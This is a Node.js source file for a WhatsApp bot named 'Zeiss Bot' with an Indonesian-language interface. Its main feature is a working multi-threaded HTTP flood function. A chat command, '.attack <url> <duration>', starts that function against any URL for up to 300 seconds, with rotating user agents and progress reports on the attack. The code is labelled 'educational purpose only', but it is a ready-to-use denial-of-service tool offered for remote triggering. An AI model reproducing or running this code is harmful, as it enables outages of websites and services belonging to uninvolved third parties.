const http = require('http');
const https = require('https');
const axios = require('axios');

// Fungsi logging yang keren
function logInfo(message) {
    console.log(`\x1b[36m[INFO]\x1b[0m ${message}`);
}

function logSuccess(message) {
    console.log(`\x1b[32m[SUCCESS]\x1b[0m ${message}`);
}

function logWarning(message) {
    console.log(`\x1b[33m[WARNING]\x1b[0m ${message}`);
}

function logError(message) {
    console.log(`\x1b[31m[ERROR]\x1b[0m ${message}`);
}

function logCommand(message) {
    console.log(`\x1b[35m[COMMAND]\x1b[0m ${message}`);
}

function logAttack(message) {
    console.log(`\x1b[91m[ATTACK]\x1b[0m ${message}`);
}

// Real HTTP Flood Implementation (Educational Purpose Only)
async function httpFlood(targetUrl, duration, delayMs = 100, threads = 10) {
    logAttack(`🚀 Starting REAL HTTP Flood attack on ${targetUrl}`);
    logAttack(`⏰ Duration: ${duration} seconds`);
    logAttack(`⏳ Delay: ${delayMs}ms`);
    logAttack(`🧵 Threads: ${threads}`);
    
    const endTime = Date.now() + (duration * 1000);
    let requestCount = 0;
    let successCount = 0;
    let errorCount = 0;
    
    const makeRequest = async (threadId) => {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ];
        
        while (Date.now() < endTime) {
            try {
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                const startTime = Date.now();
                
                const response = await axios.get(targetUrl, {
                    timeout: 10000,
                    headers: {
                        'User-Agent': userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'max-age=0'
                    },
                    validateStatus: function (status) {
                        return status >= 200 && status < 600;
                    }
                });
                
                const responseTime = Date.now() - startTime;
                requestCount++;
                successCount++;
                
                if (requestCount % 50 === 0) {
                    logAttack(`📊 Thread ${threadId}: ${requestCount} requests | ${successCount} success | ${errorCount} errors`);
                    logAttack(`⏱️  Last response time: ${responseTime}ms | Status: ${response.status}`);
                }
                
                await new Promise(resolve => setTimeout(resolve, delayMs));
                
            } catch (error) {
                requestCount++;
                errorCount++;
                
                if (errorCount % 20 === 0) {
                    logWarning(`❌ Thread ${threadId} errors: ${errorCount} - ${error.message}`);
                }
                
                await new Promise(resolve => setTimeout(resolve, delayMs));
            }
        }
    };
    
    logAttack(`🔥 Launching ${threads} attack threads...`);
    
    const threadsArray = [];
    for (let i = 1; i <= threads; i++) {
        threadsArray.push(makeRequest(i));
    }
    
    // Progress reporter
    const progressInterval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - (endTime - (duration * 1000))) / 1000);
        const remaining = duration - elapsed;
        logAttack(`📈 Progress: ${elapsed}s elapsed | ${remaining}s remaining | Total: ${requestCount} requests`);
    }, 5000);
    
    await Promise.all(threadsArray);
    clearInterval(progressInterval);
    
    logAttack(`🎯 Attack completed!`);
    logAttack(`📊 Total requests: ${requestCount}`);
    logAttack(`✅ Successful: ${successCount}`);
    logAttack(`❌ Errors: ${errorCount}`);
    logAttack(`📶 Success rate: ${((successCount / requestCount) * 100).toFixed(2)}%`);
    
    return { total: requestCount, success: successCount, errors: errorCount };
}

async function handleCommand(sock, sender, text, pushName) {
    const command = text.trim();
    
    if (command === '.menu' || command === '!menu') {
        const menuMessage = `
🤖 *BOT MENU* 🤖

*.menu* - Menampilkan menu ini
*.info* - Informasi bot
*.ping* - Test koneksi bot
*.attack <url> <duration>* - HTTP Flood Attack (Real)
  Contoh: .attack https://example.com 30

⚠️ *EDUCATIONAL PURPOSE ONLY*
⚡ *Zeiss Bot* ⚡
        `.trim();
        
        try {
            await sock.sendMessage(sender, { text: menuMessage });
            logSuccess('Menu sent to admin');
        } catch (error) {
            logError(`Error sending menu: ${error.message}`);
        }
    }
    else if (command === '.info' || command === '!info') {
        const infoMessage = `
📊 *BOT INFORMATION* 📊

🤖 *Name:* Zeiss Bot
⚡ *Version:* 2.0.0
👑 *Admin:* ${config.adminNumber}
🛡️ *Status:* Active
🔥 *Mode:* REAL HTTP Flood

*Features:*
- Admin protection
- Real HTTP Flood implementation
- Multi-threaded attacks
- Auto-reconnect

⚠️ *EDUCATIONAL PURPOSE ONLY*
🔧 *Powered by Baileys & Node.js*
        `.trim();
        
        try {
            await sock.sendMessage(sender, { text: infoMessage });
            logSuccess('Info sent to admin');
        } catch (error) {
            logError(`Error sending info: ${error.message}`);
        }
    }
    else if (command === '.ping' || command === '!ping') {
        try {
            await sock.sendMessage(sender, { text: '🏓 Pong! Bot is active and responding.' });
            logSuccess('Pong response sent');
        } catch (error) {
            logError(`Error sending ping: ${error.message}`);
        }
    }
    else if (command.startsWith('.attack ') || command.startsWith('!attack ')) {
        const args = command.split(' ').slice(1);
        if (args.length < 2) {
            try {
                await sock.sendMessage(sender, { 
                    text: '❌ *Format salah!*\nGunakan: .attack <url> <duration>\nContoh: .attack https://example.com 30\n\n⚠️ Max duration: 300 detik' 
                });
            } catch (error) {
                logError(`Error sending format message: ${error.message}`);
            }
            return;
        }
        
        const url = args[0];
        const duration = parseInt(args[1]);
        
        if (!url.startsWith('http')) {
            try {
                await sock.sendMessage(sender, { 
                    text: '❌ *URL invalid!*\nURL harus dimulai dengan http:// atau https://' 
                });
            } catch (error) {
                logError(`Error sending URL message: ${error.message}`);
            }
            return;
        }
        
        if (isNaN(duration) || duration < 1 || duration > 300) {
            try {
                await sock.sendMessage(sender, { 
                    text: '❌ *Duration invalid!*\nDuration harus angka antara 1-300 detik' 
                });
            } catch (error) {
                logError(`Error sending duration message: ${error.message}`);
            }
            return;
        }
        
        try {
            const warningMessage = `
⚠️ *WARNING: EDUCATIONAL PURPOSE ONLY* ⚠️

🚀 *Memulai REAL HTTP Flood Attack...*
📡 Target: ${url}
⏰ Duration: ${duration} detik
⏳ Delay: 100ms
🧵 Threads: 10

📊 *Attack parameters:*
- Real HTTP requests
- Multiple threads
- Random User-Agents
- Keep-alive connections

❗ *Use responsibly and only on systems you own!*
            `.trim();
            
            await sock.sendMessage(sender, { text: warningMessage });
            
            logAttack(`Starting REAL attack on ${url} for ${duration}s`);
            const startTime = Date.now();
            
            const results = await httpFlood(url, duration, 100, 10);
            
            const attackTime = Math.floor((Date.now() - startTime) / 1000);
            const successRate = ((results.success / results.total) * 100).toFixed(2);
            
            const resultMessage = `
✅ *Attack completed!*

📊 *Results:*
🎯 Target: ${url}
⏰ Duration: ${attackTime} detik
📨 Total requests: ${results.total}
✅ Successful: ${results.success}
❌ Errors: ${results.errors}
📶 Success rate: ${successRate}%

⚡ *Attack finished at:* ${new Date().toLocaleTimeString()}

⚠️ *Educational purpose completed*
            `.trim();
            
            await sock.sendMessage(sender, { text: resultMessage });
            
            logSuccess(`Attack completed with ${results.total} total requests`);
        } catch (error) {
            logError(`Error during attack: ${error.message}`);
            try {
                await sock.sendMessage(sender, { 
                    text: `❌ *Error selama attack:*\n${error.message}` 
                });
            } catch (sendError) {
                logError(`Error sending error message: ${sendError.message}`);
            }
        }
    }
    else {
        try {
            await sock.sendMessage(sender, { 
                text: '❌ *Command tidak dikenali!*\nKetik *.menu* untuk melihat daftar command.' 
            });
            logWarning(`Unknown command: ${command}`);
        } catch (error) {
            logError(`Error sending unknown command message: ${error.message}`);
        }
    }
}

module.exports = { handleCommand, httpFlood };